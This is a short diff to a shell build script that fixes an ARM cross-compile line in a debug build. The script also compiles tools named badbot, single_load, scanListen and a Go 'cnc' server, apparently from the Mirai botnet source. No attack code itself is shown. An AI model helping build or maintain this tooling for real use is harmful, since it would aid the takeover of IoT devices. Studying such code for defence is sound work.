@@ -38,7 +38,7 @@ elif [ "$1" == "debug" ]; then
     gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
     gcc -std=c99 tools/badbot.c -g -o debug/badbot
     gcc -std=c99 tools/single_load.c -g -lm -lpthread -w -o debug/single_load
-    armv6l-gcc -std=c99 -g -lm -lpthread -w -o debug/single_load.arm7
+    armv6l-gcc -std=c99 tools/single_load.c -g -lm -lpthread -w -o debug/single_load.arm7
     go build -o debug/cnc cnc/*.go
     go build -o debug/scanListen tools/scanListen.go
 else
